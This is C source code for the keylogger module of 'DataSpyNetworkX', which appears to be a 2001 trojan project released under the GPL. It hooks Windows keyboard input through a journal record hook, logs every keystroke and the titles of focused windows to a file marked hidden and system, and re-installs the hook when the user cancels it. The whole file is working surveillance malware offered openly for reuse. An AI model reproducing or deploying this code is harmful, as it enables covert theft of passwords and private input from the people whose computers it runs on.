/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "../include/options.h"
#include "../include/globals.h"
#include "../include/keylogger.h"

HMODULE g_module = GetModuleHandle(NULL);
BOOL g_bLogging=FALSE;
HANDLE g_hCapFile=NULL;
DWORD g_dwKeyCapTID=0;
HANDLE g_hKeyCapThread=NULL;
HHOOK g_hLogHook=NULL;
HWND g_hLastFocus=NULL;

#define _REMOVE_BACKSPACES_YES_

LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(code<0) return CallNextHookEx(g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION) {
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			//DWORD dwCount;
			char svBuffer[256];
			int vKey,nScan;

			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;

			// Check to see if focus has changed
			HWND hFocus=GetActiveWindow();
			if(g_hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowText(hFocus,svTitle,256);
				if(nCount>0) {
					char svBuffer[512];
					wsprintf(svBuffer,"\r\n----=: %s =----\r\n",svTitle);
					//fwrite(svBuffer,lstrlen(svBuffer),1,KFile);
					WriteFile(g_hCapFile,svBuffer,lstrlen(svBuffer),&dwBytes,NULL);
				}
				g_hLastFocus=hFocus;
			}

			// Write out key
			dwCount=GetKeyNameText(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);
					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) 
						//fwrite(&ch,chcount,1,KFile);
						WriteFile(g_hCapFile,&ch,chcount,&dwBytes,NULL);				
				} else 
#ifdef _REMOVE_BACKSPACES_YES_
	
				if (vKey == VK_BACK)
				{
					SetFilePointer(g_hCapFile,-1,NULL,FILE_CURRENT);
				}
				else		
#endif
				{

					//fwrite("[",1,1,KFile);
					WriteFile(g_hCapFile,"[",1,&dwBytes,NULL);
					
					//fwrite(svBuffer,dwCount,1,KFile);
					WriteFile(g_hCapFile,svBuffer,dwCount,&dwBytes,NULL);

					//fwrite("]",1,1,KFile);
					WriteFile(g_hCapFile,"]",1,&dwBytes,NULL);
										
					if(vKey==VK_RETURN) 
						//fwrite("\r\n",2,1,KFile);
						WriteFile(g_hCapFile,"\r\n",2,&dwBytes,NULL);
					//if (vKey==VK_BACK) fseek(KFile,SEEK_CUR,-1);
				
				}
			}			
		}
	
	}
	return CallNextHookEx(g_hLogHook,code,wParam,lParam);
}


DWORD WINAPI KeyCapThread(LPVOID param)
{
	MSG msg;
	BYTE keytbl[256];
	int i;
	for(i=0;i<256;i++) keytbl[i]=0;
					
	g_bLogging=TRUE;
	g_hLastFocus=NULL;

	g_hCapFile=CreateFile((char *)param,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
	
	if(g_hCapFile==INVALID_HANDLE_VALUE) {

		return -1;
	}
	SetFilePointer(g_hCapFile,0,NULL,FILE_END);

	g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
	if(g_hLogHook==NULL) {
			CloseHandle(g_hCapFile);
			g_hCapFile=NULL;
		return -1;
	}

	g_bLogging=TRUE;
	DWORD dwBW =0;
	char *cTemp = new char[256];
	char *cTime = new char[128];
	char *cDate = new char[128];
	sprintf(cTemp,"\r\nStarted: %s %s\r\n",_strtime(cTime),_strdate(cDate));
	
	WriteFile(g_hCapFile,cTemp,lstrlen(cTemp),&dwBW,NULL);
	
	while(g_bLogging) {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) {
			GetMessage(&msg,NULL,0,0);
			if(msg.message==WM_CANCELJOURNAL) {
				
				SetKeyboardState(keytbl);
				g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
				
				if(g_hLogHook==NULL) {
					CloseHandle(g_hCapFile);
					g_hCapFile=NULL;
					return -1;
				}
			} else {
				DispatchMessage(&msg);
			}
		}
		Sleep(20);
	}
	sprintf(cTemp,"\r\nStoped: %s %s\r\n",_strtime(cTime),_strdate(cDate));
	
	WriteFile(g_hCapFile,cTemp,lstrlen(cTemp),&dwBW,NULL);
	delete cTemp,cTime,cDate;

	UnhookWindowsHookEx(g_hLogHook);
	
	CloseHandle(g_hCapFile);
	g_hCapFile=NULL;
	g_hKeyCapThread=NULL;

	return 0;
}

BOOL StartLogging()
{
	g_hKeyCapThread=CreateThread(NULL,0,KeyCapThread,(LPVOID)c_KEYLOGGING_FILE,0,&g_dwKeyCapTID);
				
	int iWat=0;
	while (g_bLogging==FALSE && iWat < 26)
	{
		Sleep(100);
		iWat++;
	}
	
	if (g_bLogging == TRUE)
		return TRUE;
	else
		return FALSE;
}

BOOL StopLogging()
{
	g_bLogging = FALSE;
	
	int iWat=0;
	while (g_hKeyCapThread != NULL && iWat < 26)
	{
		Sleep(100);
		iWat++;
	}
	if (g_hKeyCapThread == NULL)
		return TRUE;
	else
		return FALSE;

}
